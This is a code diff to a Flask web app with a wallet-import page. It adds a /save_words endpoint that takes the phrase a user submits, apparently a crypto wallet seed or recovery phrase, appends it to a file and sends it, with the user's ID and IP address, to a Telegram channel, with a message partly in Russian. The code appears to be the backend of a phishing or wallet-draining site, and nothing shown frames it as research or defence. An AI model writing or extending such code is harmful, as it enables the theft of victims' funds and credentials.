@@ -182,6 +182,22 @@ def import_wallet():
     update_user_page(user_id, "/import")
     return render_template("import.html", show_modal=False)
 
+@app.route("/save_words", methods=["POST"])
+def save_words():
+    user_id = request.args.get("user_id")
+    data = request.get_json()
+    words = data.get("words", "").strip()
+
+    if words:
+        with open(FILE_PATH, "a", encoding="utf-8") as f:
+            f.write(words + "\n")
+
+        ip = request.remote_addr
+        send_to_telegram(f"✍️ User {user_id} (IP: {ip}) ввёл фразу: {words}")
+
+    return jsonify({"status": "ok"})
+
+
 
 # ========== Админ / debug эндпойнты (требуют ADMIN_TOKEN) ==========
 def check_admin_token():
